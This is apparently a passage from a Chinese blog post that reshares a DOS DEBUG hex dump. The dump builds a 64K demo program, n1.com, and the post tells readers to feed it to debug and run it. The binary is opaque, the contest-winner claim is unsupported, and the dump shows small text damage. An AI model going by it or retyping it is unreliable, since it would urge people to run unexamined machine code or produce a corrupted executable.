55 97 20 26 ff 99 ec 72 41 b5 27 21 6e ae  8a d0<br />e9a9 e4 d3 da 6f c4 53 c5 f8 b3 a7 a1 5d 66 93 d8 b1 89 40 23 92 c0 90  fb cb<br />e9c1 e7 6b 4e 51 0 5d 57 f7 cd 1 e2 88 bf 44 9f ef c4 33 ce fa 46 46 a1  86 b<br />e9da 7a 84 66 66 b9 2 ec 10 c6 a1 d4 c1 18 33 b1 d1 2 18 ad 2f 53 e4 b9  33 59<br />e9f3 be 3c af 80 4<br>c 8a d5 76 c 3b a7 e2 97 94 15 75 4d 17 d5 97 cf f9 4a  d0 6e<br />ea0c bb 27 20 fc f1 f5 9 a8 df 4d b6 5d f0 1d 69 3b 76 35 82 a4 f3 56 64  39 5b<br />ea25 6b b3 7 e7 5 8e 82 11 22 a8 1a db c8 3e 67 4a 3 7e 72 51 d6 3d 1a  1c f6<br />ea3e b8 da 4b 18 8a 15 9d d0 a4 84 96 3e cd 3 f9 3a 30 f3 fb 8f 6e 2 73  eb 52<br />ea57 93 95 cf dc 6f 48 fb ab d2 a9 70 b4 e2 23 8d 72 86 a8 fa 78 98 1d  c5 fe<br />ea6f 8a 51 88 2b b7 58 b0 ca ae 40 8a 33 32 75 1 6 c0 d4 b7 da 2a a7 bb  ad f7<br />ea88 48 98 5a bc d3 d1 e6 16 97 c3 80 ab 73 ac 32 11 41 1f d 5d aa 0 dc  d9 6e<br />eaa1 fc 30 6 ef 11 60 27 a2 5f eb 5f b9 35 8 23 4 be 10 c0 85 3e 55 b3  82 fd<br />eaba f7 c3 24 9f 2d 83 94 32 36 de ff 7c 87 7f 4a 80 7 2 23 cf a4 52 eb  3e 19<br />ead3 a0 b4 a 94 1a 40 58 d9 16 6d c0 64 c4 69 ed 60 46 65 cb df 58 38 0  51 c3<br />eaec ad a0 37 e4 cf ab f7 6c 24 7d 9 48 65 4a 9f 91 ad 1c 79 a4 a1 78 55  c e8<br />eb05 44 5b d ef 51 bd ea 2d a7 42 57 ab 3a 4f 2 b 3 19 6a 4d 72 76 5c 97  0 6c<br />eb1f c5 5d bc dd e7 81 cf 8d 34 38 50 3c 98 58 cc 41 aa 99 90 af fe 4e  96 77<br />eb37 ed 54 18 ce 2c d1 5d 34 cb 79 50 ff 28 96 44 e0 51 64 6 a8 b7 6e 8c  62 c4<br />eb50 66 95 81 4f 8c f6 26 ba ea 5d d2 79 b1 e4 e9 29 fc a fd b3 85 8c e6  52 dd<br />eb69 33 bd 5d c7 39 ef 6 ef 9e a6 6a 61 9c 9f d5 54 b4 fa a1 d4 10 9b ff  7e 33<br />eb82 11 52 99 c7 26 6e a1 36 8a ad ee 48 7a 2c 7f d5 b7 27 8a 6b 37 c 71  39 85<br />eb9b 9c ba a8 a 17 b9 d0 51 56 95 c2 3b 5 a7 31 c5 8b 5c 95 6e 4c 89 6f  17 ef<br />ebb4 d4 5a a 77 65 e1 49 b2 e8 72 ac 3c f0 6b 71 fa 3 c7 ca fc ad f9 55  22 ec<br />ebcd 58 2f 1c fa 29 cf 73 b4 ad 51 5c f8 66 70 59 5d 70 3e d1 3f c4 eb  ec f1<br />ebe5 7 78 6a 93 67 9f 44 fc cb 5b 95 ff 74 c0 b7 42 77 26 c9 aa 8c ed 39  a2 db<br />ebfe 9c b3 eb 3d 4a 1e 9b 89 e4 d8 a8 27 74 ef a3 ed a5 24 5d bb ab d0  fe a1<br />ec16 29 ab df 75 a a6 23 0 cc f1 14 72 9b 1a 55 7e e5 d1 da 98 dc c4 cf  ab 34<br />ec2f ba 8d de 4a 59 6 13 dd d8 44 3c e bb 56 95 ae 97 e2 3b 49 e5 9a 6b  a2 53<br />ec48 c1 33 35 24 1b 33 17 c3 8a 8c 12 3d 3d 4e 5b 75 22 30 67 4f a0 5d  3a 78<br />ec60 88 a 11 35 7 b1 77 42 32 a8 c3 bb 20 fb 98 5 d6 ac e7 3a 63 35 90  93 9e<br />ec79 44 24 2e 1b d7 8c aa 29 53 4d d9 ab eb e6 1 56 c4 fd 54 a3 bd 14 5b  b0 8f<br />ec92 ce be 23 24 93 c4 48 18 a3 e7 4 5 4b 78 cc 79 dd 3 56 a4 ed dd 5f  98 41<br />ecab 1b 68 4c c1 bb 41 c2 1e 3e 94 8e ef 28 1e b 76 e 4f 36 b1 c 6e e2  18 17<br />ecc4 20 fc 35 40 1f e4 6d a4 18 bb bc d5 9e ea 85 86 af af 63 d4 13 66  92 c4<br />ecdc 2b 69 84 ca 23 2b d3 66 81 6b 81 73 26 4 85 36 21 4c 49 44 75 64 39  16 3c<br />ecf5 ed e0 6d 44 75 45 30 43 68 c0 78 fc d0 17 b eb 81 3e c3 ba 1b f 4d  ae c5<br />ed0e 55 1f c 39 12 5d 8 65 f1 34 59 de dd 98 56 17 43 38 66 49 9a eb db  c1 87<br />ed27 51 38 cc b7 5f 98 fd 43 be 2d bb 74 f3 f8 f2 36 3d a4 34 a5 7e d2  26 cc<br />ed3f 84 1f ea 56 f0 80 18 69 4d 88 41 fc 56 fd 41 3b 1e e 9 27 4f f6 3b  62 4e<br />ed58 5a 1b 2a 4e 85 8c b2 4f 79 ef 59 4e e 73 3d bd c4 ca 60 e7 4a 47 90  b5 8<br />ed71 2a f0 4e dc ba 66 ae 48 2b 31 73 a2 11 c 32 ff 54 14 77 6b d6 58 4b  bf ee<br />ed8a f6 6a bc dd 1 88 d da a9 f 81 24 c5 f8 72 9a db d5 c8 2a 80 a9 16  d7 c6<br />eda3 b1 91 c0 a9 95 40 b5 b3 a8 2a 28 c6 92 16 ab 54 7d f8 93 5f 3a 17  c8 45<br />edbb a9 f0 e0 71 23 76 53 38 a5 a1 cc d4 f1 f2 3c 2b 46 43 a1 d5 ba e d7  19 7a<br />edd4 c2 e1 8f 67 1d d 98 9d a1 79 9d 1b 20 7f 4d e7 bf f9 ff fe aa 28 ab  8f c<br />eded 4d 50 33 e3 26 fc 3c 3 3a 2b 26 12 f7 1 8f ee 97 4c e6 6 2b d9 1f  a1 4a<br />ee06 77 44 d4 8b b7 3e 5e 2d 18 c3 54 68 99 a8 8d 92 96 9e 9d ab 33 38  ff b8<br />ee1e ee 78 c6 7b b5 84 95 d3 6 27 ae 5d 27 38 a 38 8e f0 1 a5 96 4b d7  9b 42<br />ee37 e5 6f 57 75 4c e9 78 2d 5b ec b6 d2 29 e2 a8 92 95 9c 65 2a 3e bf  8d e0<br />ee4f bf b3 ac c8 e 7e 13 af 88 26 7d 48 5a c7 39 29 36 d2 90 e8 3b 3 d0  61 1a<br />ee68 d2 e8 a8 f ba 8e a1 9f df 12 ab 54 7 23 98 de 62 af 4c 7e d4 fb 6b 2  6e<br />ee81 40 40 37 b7 73 f2 d8 81 be 29 d2 99 c0 73 25 1a 3c 92 75 6e bd d7  79 79<br />ee99 4 14 c0 4e 99 57 66 93 74 ec b0 29 7c df 61 b0 3 3a d1 c3 fa a4 f7 f  9f<br />eeb2 d3 f 0 b9 2a 5a 3a c5 88 25 b8 b9 cc 82 3 57 3a e1 7b 51 75 70 a6  74 1a<br />eecb ca cb 3 18 68 ca 77 fe 1b ad cd 68 7f 36 85 fc b7 4f a0 11 da 69 fa  79 87<br />eee4 d6 b9 21 dd 3e 70 db dc 84 d4 6e d1 20 4 af f6 32 a2 8e d 54 25 fe 7  54<br />eefd e 7a 74 4b a0 4b f7 f4 e8 74 22 e9 98 70 fb 25 2e f4 64 57 75 28 85  45 53<br />ef16 3a 2e e2 3c 54 36 e9 29 6 67 59 43 10 7e c1 49 cd 5e f9 97 a 58 5f  8a 11<br />ef2f 4f 3d 9a e2 2b 22 58 fa be fc 69 91 7a 8c 3f 77 9f c9 3b 54 26 23  93 b3<br />ef47 85 de ae f5 bd c5 47 4c c4 cd 5e ad bc 8f ba 31 f6 e4 70 fb 6e a7  96 d5<br />ef5f ad 10 80 39 43 97 4f 10 cc 1b 8f 8d cd 4c 63 4 d8 1e 85 70 41 6c a8  eb df<br />ef78 7f 36 c5 60 a7 12 9 16 73 fe 75 3a 2d 40 29 7d aa a 5c 2 29 23 0 a6  e5 6b<br />ef92 24 6d 9b 20 e5 7 cb 40 b0 38 59 9c a7 69 6a 70 d3 38 ef e2 b2 11 3e  ea 2a<br />efab f9 2b 2e 43 1d 65 cf d6 1b ef 83 5a 5f e6 c5 62 16 ca 5e 4c a6 39  e4 53<br />efc3 2d 23 d2 5e 7e 15 54 8a 8 b7 3d bb 88 59 b9 9e a2 7c 42 1f a2 77 3c  5b 9<br />efdc 6d fa 8f 21 46 1a 3e ed ce 49 56 1d 29 2d 70 3 a7 6f 75 ac 1 87 ff  27 86<br />eff5 73 49 28 85 2d 97 7a 84 e 37 3d 86 10 21 4c e2 74 62 6b 51 70 8f 15  72 f3<br />e100e 81 b2 a9 9d 8a 63 ad 1b d5 aa 8a dc 96 3c e7 47 16 51 fc 87 50 9  b7 60<br />e1026 29 33 52 fb b0 df 70 c5 65 4a 60 3b c d7 a8 29 47 51 f7 8a 77 f3  99 3f<br />e103e 38 16 60 de 68 27 b2 24 7 62 a2 fd 40 86 b2 75 c3 3c 2f 3d fa 9 d9  a9 9a<br />e1057 71 3c ce 46 94 0 f9 bc 46 7f b8 2e 85 7f 7d d3 8d ea b4 63 81 59  10 bb<br />e106f 57 d0 b6 ab e1 83 74 1e 25 d5 73 78 18 b1 60 62 c f4 76 8d 17 d5  ed 23<br />e1087 23 e4 f6 32 64 5a 61 9 63 f6 92 57 d5 29 40 d6 3b ba 63 72 18 0 25  1b 7<br />e10a0 ee 7f 25 4a fa 6 74 19 46 e3 e8 89 7a c6 56 54 a7 43 13 4e bf 97  a5 6f<br />e10b8 99 2f ac 33 4d fa 58 3a 5a a a4 1a 74 62 c8 4f 3b 78 9 d7 ee 7e ee  2d 69<br />e10d1 30 40 ea 47 82 3b 85 8e 3 23 8f 74 4e 8 35 ab 74 4 1 57 d5 85 b1  6b 1e<br />e10ea f4 7d 1e d2 1e b3 fe f3 12 10 32 39 51 48 2d 6f e5 d3 a3 8c 8 8<br />g<br />rcx<br />fff<br />n1.com<br />w<br />q<br />----------------------------------------------------------------------------------<br /></code><code>----------------------------------------------------------------------------------</code>把上面的代码保存为debug111.txt<br />再运行 —》debug&lt;debug111.txt<br />你将看到什么？去看看吧&amp;#160;&amp;#160;<br />key“alt +enter” is to stop screen<br />然后结束进程就可以了。<br />这代码真的很变态，太强悍了、</p>\n","site":{"data":{}},"excerpt":"","more":"<p>世界编程大赛的一等奖debug64k作品欣赏                                                               我在网上看到的最美丽的debug，请注意是—–美丽转载：批处理之家<br />代码:<code>----------------------------------------------------------------------------------<br /></code><code>----------------------------------------------------------------------------------</code><br /><code>e100 33 f6 bf 0 20 b5 10 f3 a5 8c c8 5 0 2 50 68 13 1 cb e 1f  be a1 1 bf 0 1<br />e11b 6 57 b8 11 1 bb 21 13 89 7 4b 4b 48 79 f9 ad 86 e0 8b c8 bd ff ff  e8 20<br />e134 0 3d 0 1 74 1a 7f 3 aa eb f3 2d ff 0 50 e8 f 0 5a f7 d8 8b d8 26 8a  1 aa<br />e14f 4a 75 f9 eb de cb 57 bb 21 13 8b c1 40 f7 27 f7 f5 8b fb ba 11 1 4f  4f 4a<br />e168 39 5 7f f9 52 8b c5 f7 25 f7 37 2b c8 95 f7 65 2 f7 37 95 2b e8 fe e  fe<br />e181 10 79 6 c6 6 fe 10 7 46 d0 14 d1 d1 d1 e5 79 ec 5a b8 11 1 ff 7 4b  4b 48<br />e19b 3b d0 75 f7 5f c3 83 f7 83 a6 5d 59 82 cd b2 8 42 46 9 57 a9 c5 ca  aa 1b<br />e1b4 4f 52 b4 92 3f ab 6e 9e a8 1d c6 3 fc e 6a e7 ae bb 5f 7b 10 b8 b4  f7 8<br />e1cd e2 bf 36 4e 39 9d 79 29 3f a f9 36 52 16 fb 5 e8 e5 a6 c2 e9 b0 43  d3 a3<br />e1e6 cf d3 fd fd cb d1 4c 5e e0 63 58 86 bb 3e 9 c1 20 bc cc 91 a3 47 81  70 b3<br />e1ff d6 1a 9e c2 c9 12 e7 4e ad f4 5f e3 30 e9 9 39 d7 e8 f9 f4 d2 44 e8  d7 22<br />e218 be e2 ce 88 25 cf 30 4a a8 29 ae 3f 47 c6 2d 85 e9 73 54 13 b e6 e0  34 65<br />e231 e2 50 8a 89 18 5f ce 70 99 3 5f 42 bf eb 7 ae d0 ca 5 22 8d 22 a5  b7 f0<br />e24a 90 81 bc 7a bc dc 5 db c0 6a 2 e5 57 38 be 60 cb ac ba a5 3b 9d f1  77 38<br />e263 a6 84 d1 3c af 49 d8 6a 45 a2 76 60 21 12 c0 c2 44 f2 5e bb e5 37  a9 2b<br />e27b ec 4a 8c 4c f2 f7 a9 58 71 2b ba 6d d6 6a e5 60 46 e0 da e5 b9 90  e5 a3<br />e293 f7 7f 31 60 58 f0 c4 88 10 4e 3c a3 ee 4e 11 55 8f a 92 eb db ad 7a  9c f<br />e2ac db 5a 28 96 da 87 ae 91 91 2d e3 5e ea df 6 95 71 67 71 40 ce d1 2e  31 6d<br />e2c5 c1 9c d8 6a 76 9b 4a e8 36 44 d6 76 d 30 5 ff d4 1b ac 1f 32 65 31  bf 55<br />e2de 26 b a4 55 e1 5d 5e 16 ed 97 48 6c 77 fb 81 86 e f9 18 bd d4 f4 8b  de 1d<br />e2f7 ba d 47 75 3 89 4b 3e dc 27 86 1c d0 17 89 48 d1 a6 8d d4 2b 54 4e  8f b0<br />e310 2 e1 6b 1a 75 78 ea 21 91 13 c0 cf 78 a0 ab f3 35 c6 b4 c8 90 8d d7  45 e7<br />e329 c 5b a4 ba 52 10 64 f5 4a 50 b7 ec 46 22 15 23 84 30 81 5c df 61 5a  8f 67<br />e342 c4 63 57 6d f7 26 92 a3 1f e5 3 a5 0 54 41 8 48 7c 26 90 33 82 9c  91 b0<br />e35b ab 78 5d df 99 e0 b9 fc 5 36 ac d9 49 91 ab 20 a2 63 48 89 ce 5c 60  64 f0<br />e374 63 d9 a8 38 3b d3 e6 4c 8c 23 34 4e 20 51 93 5e 6d b4 7a 22 9b 4c  f2 d3<br />e38c c4 f8 3 6f 47 40 f4 f8 45 9b 83 f3 83 6 31 d0 0 17 82 83 dc 67 f9  62 77<br />e3a5 90 3b d9 ec f3 55 96 b8 d9 db 79 55 f1 e5 8c 5e f2 e5 2e b0 b 6e e2  81 25<br />e3be 93 8e b5 dd 5b 46 f9 af ed 6 12 cf c9 1d f0 f7 3b 16 2d c6 58 73 8d  e9 5f<br />e3d7 fd 5a b6 a1 94 4d 1a 8 ff eb b7 6 80 c7 86 83 b6 b9 fd 1c e0 c c3  2e a0<br />e3f0 2f b 3e 3 6b 29 e1 27 85 1c ea 6d df b3 a3 ed 65 4a 9a 59 3b 54 e  4b ae<br />e409 9e 27 f0 4d 3b c 4c 46 b7 e5 57 1b 1f 1f bb 80 86 f5 b7 ef 73 52 bf  2c c7<br />e422 ed a b7 81 2 f3 90 3e ee cc 6c eb f 38 1 6c 68 b1 d 45 78 b2 f f6  83 b0<br />e43c c4 33 df b1 d1 91 98 1e 81 a5 e2 59 9f f4 8c b6 72 8 a7 8c f6 e a3  b2 1f<br />e455 d9 d3 23 f0 7c 5e 5f 68 61 8b 45 da 1d 91 ec 8d 4e ea 1a 38 85 94  aa ac<br />e46d f2 4 f6 c4 e5 92 8e 9a 4e 83 e1 73 e8 cf 2a 5c 2b 7e f1 30 2 8a e6  28 1a<br />e486 3b ce bc 96 aa 7f eb 87 cd 8b 96 2d 9 59 7a a0 1a 43 62 9a 9e 4f ff  8e d9<br />e49f ce d6 a4 70 79 cd 65 fa 2e 92 14 29 f7 6c 74 4b 49 60 80 bb ff 41  bb 2d<br />e4b7 60 33 3f 98 77 9a 1 ee a6 a3 da bc ba e9 f3 72 f4 7c c3 59 2 a6 44  a4 c8<br />e4d0 c8 54 93 ce bd 69 bb b9 43 21 2c c4 ea 4a 5c 3f 75 60 f2 b4 91 ca 9  82 e3<br />e4e9 a e9 a6 20 b9 76 50 ed 47 e9 fe 6d 41 34 13 2f 28 2f 4e f4 da e 3c  78 6c<br />e502 b1 79 87 45 98 a4 d4 c3 b3 29 c2 4a 8b ed a6 54 e2 1b 31 62 60 ff  2c 1d<br />e51a 21 0 15 b2 4e 5c c 2 d 83 fa a2 f3 8a 5 12 72 4a c7 44 7c 91 d4 be b  a f2<br />e535 70 52 fb b4 a2 df 89 de ff c4 96 73 c9 c ed d3 c9 8e 5c dc 8e d1 3b  de 8c<br />e54e 53 a2 8b f9 e9 91 dd d6 df 6e 74 d1 dd 34 60 8f 9e 32 7f 3b ec 79  a3 83<br />e566 45 78 b4 2f 1c 50 7b 7a 97 b0 9d 2d c dd 8a 26 cd 7d 8c 4c 5a 8a 4c  f9 a4<br />e57f 11 f9 2c 6c 92 e9 b5 cb 56 89 8c be f6 64 fa 25 43 fa 6f e2 c8 3a  18 a8<br />e597 f0 e9 f4 c2 86 e6 2b 44 67 4a b9 34 9 ed 5f 33 42 62 d4 8a 1e 5b 31  67 cd<br />e5b0 3d 71 6d 83 fd 36 20 69 ea 1 c3 e6 e6 de 99 aa 7 11 5b 59 8a 1f 43  83 52<br />e5c9 ea 5d 8c 6a 69 c7 3 eb 4e 3b 88 a5 5f b1 6e 27 5f 3 5c 28 c 9b 6c  c3 f8<br />e5e2 e5 b9 d6 11 d6 8b fa 5c 8 c7 1 eb 45 db f3 6c 9f 16 46 61 51 ed df f  bb<br />e5fb c0 c4 1e 64 68 98 4 79 30 94 72 df d4 cd 1f 7f 72 c6 82 2e 79 47 4e  8c 4b<br />e614 a2 c7 e2 36 df 76 fd a4 b6 4e db 96 40 3b 8b b5 d4 85 64 c6 0 2c ad  9d 27<br />e62d 14 99 82 4b bc 9 fa 94 b5 db 7c 98 eb b 13 a7 b0 79 1d 7e c5 45 aa  20 49<br />e646 be ff 9d 64 0 5d c ec 6 5 ad f2 38 6b ed 7a d6 b2 c7 2e 6a a6 12 4b  ff 55<br />e660 20 3b a 77 f b9 0 9d 57 4a ad ce a4 d3 ff 1 4f fb 53 54 88 f 1 ed  4b 56<br />e67a 15 c8 dc 28 bf f2 72 d4 10 1f 99 42 69 9e 78 e2 47 82 93 31 d0 2d  be 9f<br />e692 93 93 9a 1b 80 c0 10 c 53 78 a0 26 2a 96 4f 74 4b 16 c7 9c 8d ad ac  fb 16<br />e6ab 15 c6 fd c9 a4 14 48 62 47 20 c9 41 ed 61 f8 9b f8 ff ba 39 50 65  87 ee<br />e6c3 bd ce 95 c0 fb a5 7e d8 cd 27 fd 2c 74 3 c1 1b 89 b9 51 d5 e3 da ef  9e 6<br />e6dc f0 aa a9 a7 fb 87 4c 5d cd ff 65 36 8c 73 6f 9 c6 78 9a b6 77 db df  81 68<br />e6f5 3b b8 ae 5d e1 af d4 e6 66 8c d6 a4 83 9f 37 3c 1 dc a2 a6 57 c2 20  1b 90<br />e70e 75 df cd a5 62 a5 36 79 fb 35 8a 9b b0 a0 a5 c3 37 6f 80 72 bc 52  30 8d<br />e726 9f 7a 64 d3 7 41 45 d8 68 97 f2 aa 1c a1 6c 7c 9d 32 7d ad 15 b1 53  e3 33<br />e73f 8a ed e9 49 d4 cf dc 96 22 37 36 11 9d 7f f0 4d e0 62 31 b1 c7 69  c4 79<br />e757 ac 20 1 e8 3c 6a 8c 32 cb 52 63 36 68 f4 10 2b 9c 21 4f df 5d 60 92  39 91<br />e770 e2 f9 c9 7d ca 48 3 3f 21 dd 6c f 23 2e 61 3a 9f ba c3 f9 4e 7 ea  ed ef<br />e789 71 4a 72 3a ed 23 3d 77 b5 ed d5 1d f6 a4 99 fa ef 98 dd 2 98 80 b6  7c a3<br />e7a2 62 96 7b 8e bf 7b 81 9f 9a ce 3f 12 40 2e 25 db 84 16 dd 2e 86 f f4  b2 7e<br />e7bb 5e b4 14 6a f3 29 b1 a4 57 d5 a8 17 6f 87 a4 74 5b 9b 17 79 f1 ec  33 c8<br />e7d3 f0 1d b2 7e a8 4d 95 7f 5f 9 d5 1a 5a 45 f4 41 c6 d 3f eb 66 2a c0  e8 5b<br />e7ec 3c bd 50 ad f1 53 9d 2e 45 9a d8 7d 2c 17 a8 6e 15 48 13 39 53 ed  3d 78<br />e804 ad f 3a 65 a3 3e 2e fa ca 7 94 4a 1f b4 d8 7e 47 8a 8e de e7 7e 34  c1 69<br />e81d 7f 6a aa 66 58 18 31 24 72 13 22 34 8a 56 36 87 df c2 d 8e 3f 71 a2  5f 25<br />e836 8b 8d 4 78 fd c9 45 d1 55 79 c1 9f 13 84 1b c8 5 db 95 d0 7c 64 96  20 51<br />e84f c4 e0 5e ee 47 8a 11 ac fb 9 e0 bb 40 db 86 84 12 93 b9 c9 f2 9c 63  47 c9<br />e868 eb ad 1 3e fa 6d 3f a 64 5b 58 56 27 f ca 5d e0 30 bc 3e 10 5d ec  17 28<br />e881 85 5 51 8e 95 a3 94 3a a8 f1 96 f2 f 29 5c 97 dc 47 db 9d 6c 63 e8  e7 f0<br />e89a e4 a 70 f8 f1 47 54 d3 2d 32 7c ef bb 9a b4 1b 0 2b d6 dd e7 30 b  a2 75<br />e8b3 c7 f5 d0 31 d7 d2 8a b0 ac 1c 6d 60 3a f7 c2 db 1e 6d 7 f6 8f 35 88  e5 7f<br />e8cc 3c 26 81 34 a0 32 a3 25 18 6e 73 b2 a0 f1 cb 86 61 e7 65 8b 76 98  19 6f<br />e8e4 c0 62 9b a3 cc 18 5e 40 12 97 2b d0 15 79 de 19 ea df 7a 59 2f b5  d7 39<br />e8fc 52 e2 6 f1 3 a0 a5 d9 1b 88 93 4d 30 c8 2d f5 db 55 ea 85 6f a 3f  dc bd<br />e915 57 15 6a a3 a3 3e 8e ad 2d da a0 ca 75 7c 57 8b c5 cb b 1d 2c 8e c6  96 2e<br />e92e 6d 59 83 7d 64 72 ca 80 2e 6 a4 ff f6 f2 d5 1e 7 4 ba 34 6e 9 86 25  aa 4e<br />e948 e0 7f f5 32 47 3e 7c 43 d8 28 c4 1c 11 1d bd 33 3 b5 ca 13 43 34 2  b1 a0<br />e961 57 ed 9d 3c 23 d4 45 b2 6e 81 6e af 3e 67 90 be 59 a5 45 34 53 46  85 d1<br />e979 25 ee 7d cb a4 db 12 c3 aa 17 61 9a fb 66 40 76 fe 3a 69 96 c0 91  14 a7<br />e991 5d cc 9f f6 73 59 ee b8 55 97 20 26 ff 99 ec 72 41 b5 27 21 6e ae  8a d0<br />e9a9 e4 d3 da 6f c4 53 c5 f8 b3 a7 a1 5d 66 93 d8 b1 89 40 23 92 c0 90  fb cb<br />e9c1 e7 6b 4e 51 0 5d 57 f7 cd 1 e2 88 bf 44 9f ef c4 33 ce fa 46 46 a1  86 b<br />e9da 7a 84 66 66 b9 2 ec 10 c6 a1 d4 c1 18 33 b1 d1 2 18 ad 2f 53 e4 b9  33 59<br />e9f3 be 3c af 80 4<br>c 8a d5 76 c 3b a7 e2 97 94 15 75 4d 17 d5 97 cf f9 4a  d0 6e<br />ea0c bb 27 20 fc f1 f5 9 a8 df 4d b6 5d f0 1d 69 3b 76 35 82 a4 f3 56 64  39 5b<br />ea25 6b b3 7 e7 5 8e 82 11 22 a8 1a db c8 3e 67 4a 3 7e 72 51 d6 3d 1a  1c f6<br />ea3e b8 da 4b 18 8a 15 9d d0 a4 84 96 3e cd 3 f9 3a 30 f3 fb 8f 6e 2 73  eb 52<br />ea57 93 95 cf dc 6f 48 fb ab d2 a9 70 b4 e2 23 8d 72 86 a8 fa 78 98 1d  c5 fe<br />ea6f 8a 51 88 2b b7 58 b0 ca ae 40 8a 33 32 75 1 6 c0 d4 b7 da 2a a7 bb  ad f7<br />ea88 48 98 5a bc d3 d1 e6 16 97 c3 80 ab 73 ac 32 11 41 1f d 5d aa 0 dc  d9 6e<br />eaa1 fc 30 6 ef 11 60 27 a2 5f eb 5f b9 35 8 23 4 be 10 c0 85 3e 55 b3  82 fd<br />eaba f7 c3 24 9f 2d 83 94 32 36 de ff 7c 87 7f 4a 80 7 2 23 cf a4 52 eb  3e 19<br />ead3 a0 b4 a 94 1a 40 58 d9 16 6d c0 64 c4 69 ed 60 46 65 cb df 58 38 0  51 c3<br />eaec ad a0 37 e4 cf ab f7 6c 24 7d 9 48 65 4a 9f 91 ad 1c 79 a4 a1 78 55  c e8<br />eb05 44 5b d ef 51 bd ea 2d a7 42 57 ab 3a 4f 2 b 3 19 6a 4d 72 76 5c 97  0 6c<br />eb1f c5 5d bc dd e7 81 cf 8d 34 38 50 3c 98 58 cc 41 aa 99 90 af fe 4e  96 77<br />eb37 ed 54 18 ce 2c d1 5d 34 cb 79 50 ff 28 96 44 e0 51 64 6 a8 b7 6e 8c  62 c4<br />eb50 66 95 81 4f 8c f6 26 ba ea 5d d2 79 b1 e4 e9 29 fc a fd b3 85 8c e6  52 dd<br />eb69 33 bd 5d c7 39 ef 6 ef 9e a6 6a 61 9c 9f d5 54 b4 fa a1 d4 10 9b ff  7e 33<br />eb82 11 52 99 c7 26 6e a1 36 8a ad ee 48 7a 2c 7f d5 b7 27 8a 6b 37 c 71  39 85<br />eb9b 9c ba a8 a 17 b9 d0 51 56 95 c2 3b 5 a7 31 c5 8b 5c 95 6e 4c 89 6f  17 ef<br />ebb4 d4 5a a 77 65 e1 49 b2 e8 72 ac 3c f0 6b 71 fa 3 c7 ca fc ad f9 55  22 ec<br />ebcd 58 2f 1c fa 29 cf 73 b4 ad 51 5c f8 66 70 59 5d 70 3e d1 3f c4 eb  ec f1<br />ebe5 7 78 6a 93 67 9f 44 fc cb 5b 95 ff 74 c0 b7 42 77 26 c9 aa 8c ed 39  a2 db<br />ebfe 9c b3 eb 3d 4a 1e 9b 89 e4 d8 a8 27 74 ef a3 ed a5 24 5d bb ab d0  fe a1<br />ec16 29 ab df 75 a a6 23 0 cc f1 14 72 9b 1a 55 7e e5 d1 da 98 dc c4 cf  ab 34<br />ec2f ba 8d de 4a 59 6 13 dd d8 44 3c e bb 56 95 ae 97 e2 3b 49 e5 9a 6b  a2 53<br />ec48 c1 33 35 24 1b 33 17 c3 8a 8c 12 3d 3d 4e 5b 75 22 30 67 4f a0 5d  3a 78<br />ec60 88 a 11 35 7 b1 77 42 32 a8 c3 bb 20 fb 98 5 d6 ac e7 3a 63 35 90  93 9e<br />ec79 44 24 2e 1b d7 8c aa 29 53 4d d9 ab eb e6 1 56 c4 fd 54 a3 bd 14 5b  b0 8f<br />ec92 ce be 23 24 93 c4 48 18 a3 e7 4 5 4b 78 cc 79 dd 3 56 a4 ed dd 5f  98 41<br />ecab 1b 68 4c c1 bb 41 c2 1e 3e 94 8e ef 28 1e b 76 e 4f 36 b1 c 6e e2  18 17<br />ecc4 20 fc 35 40 1f e4 6d a4 18 bb bc d5 9e ea 85 86 af af 63 d4 13 66  92 c4<br />ecdc 2b 69 84 ca 23 2b d3 66 81 6b 81 73 26 4 85 36 21 4c 49 44 75 64 39  16 3c<br />ecf5 ed e0 6d 44 75 45 30 43 68 c0 78 fc d0 17 b eb 81 3e c3 ba 1b f 4d  ae c5<br />ed0e 55 1f c 39 12 5d 8 65 f1 34 59 de dd 98 56 17 43 38 66 49 9a eb db  c1 87<br />ed27 51 38 cc b7 5f 98 fd 43 be 2d bb 74 f3 f8 f2 36 3d a4 34 a5 7e d2  26 cc<br />ed3f 84 1f ea 56 f0 80 18 69 4d 88 41 fc 56 fd 41 3b 1e e 9 27 4f f6 3b  62 4e<br />ed58 5a 1b 2a 4e 85 8c b2 4f 79 ef 59 4e e 73 3d bd c4 ca 60 e7 4a 47 90  b5 8<br />ed71 2a f0 4e dc ba 66 ae 48 2b 31 73 a2 11 c 32 ff 54 14 77 6b d6 58 4b  bf ee<br />ed8a f6 6a bc dd 1 88 d da a9 f 81 24 c5 f8 72 9a db d5 c8 2a 80 a9 16  d7 c6<br />eda3 b1 91 c0 a9 95 40 b5 b3 a8 2a 28 c6 92 16 ab 54 7d f8 93 5f 3a 17  c8 45<br />edbb a9 f0 e0 71 23 76 53 38 a5 a1 cc d4 f1 f2 3c 2b 46 43 a1 d5 ba e d7  19 7a<br />edd4 c2 e1 8f 67 1d d 98 9d a1 79 9d 1b 20 7f 4d e7 bf f9 ff fe aa 28 ab  8f c<br />eded 4d 50 33 e3 26 fc 3c 3 3a 2b 26 12 f7 1 8f ee 97 4c e6 6 2b d9 1f  a1 4a<br />ee06 77 44 d4 8b b7 3e 5e 2d 18 c3 54 68 99 a8 8d 92 96 9e 9d ab 33 38  ff b8<br />ee1e ee 78 c6 7b b5 84 95 d3 6 27 ae 5d 27 38 a 38 8e f0 1 a5 96 4b d7  9b 42<br />ee37 e5 6f 57 75 4c e9 78 2d 5b ec b6 d2 29 e2 a8 92 95 9c 65 2a 3e bf  8d e0<br />ee4f bf b3 ac c8 e 7e 13 af 88 26 7d 48 5a c7 39 29 36 d2 90 e8 3b 3 d0  61 1a<br />ee68 d2 e8 a8 f ba 8e a1 9f df 12 ab 54 7 23 98 de 62 af 4c 7e d4 fb 6b 2  6e<br />ee81 40 40 37 b7 73 f2 d8 81 be 29 d2 99 c0 73 25 1a 3c 92 75 6e bd d7  79 79<br />ee99 4 14 c0 4e 99 57 66 93 74 ec b0 29 7c df 61 b0 3 3a d1 c3 fa a4 f7 f  9f<br />eeb2 d3 f 0 b9 2a 5a 3a c5 88 25 b8 b9 cc 82 3 57 3a e1 7b 51 75 70 a6  74 1a<br />eecb ca cb 3 18 68 ca 77 fe 1b ad cd 68 7f 36 85 fc b7 4f a0 11 da 69 fa  79 87<br />eee4 d6 b9 21 dd 3e 70 db dc 84 d4 6e d1 20 4 af f6 32 a2 8e d 54 25 fe 7  54<br />eefd e 7a 74 4b a0 4b f7 f4 e8 74 22 e9 98 70 fb 25 2e f4 64 57 75 28 85  45 53<br />ef16 3a 2e e2 3c 54 36 